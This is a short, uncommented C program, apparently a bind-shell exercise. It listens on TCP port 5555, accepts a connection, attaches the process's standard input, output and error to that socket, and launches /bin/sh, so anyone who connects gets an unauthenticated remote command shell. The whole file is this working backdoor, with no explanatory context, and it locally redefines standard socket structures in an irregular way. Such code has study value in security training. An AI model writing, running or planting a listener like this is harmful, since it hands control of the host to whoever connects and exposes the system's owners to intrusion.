#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>

int main(void) {

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in {
        short           sin_family;
        unsigned short  sin_port;
        struct in_addr  sin_addr;
        char            sin_zero[8];
    } server_addr;

    struct in_addr {
        unsigned long s_addr;
    };

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr));

    listen(server_fd, 0);

    int conn_socket = accept(server_fd, NULL, NULL);

    if (conn_socket > 0) {
        printf("Accepted\n");
    }
    else {
        printf("Not accepted\n");
    }

    dup2(conn_socket, 0);
    dup2(conn_socket, 1);
    dup2(conn_socket, 2);

    printf("Hello\n");

    execve("/bin/sh", NULL, NULL);
}

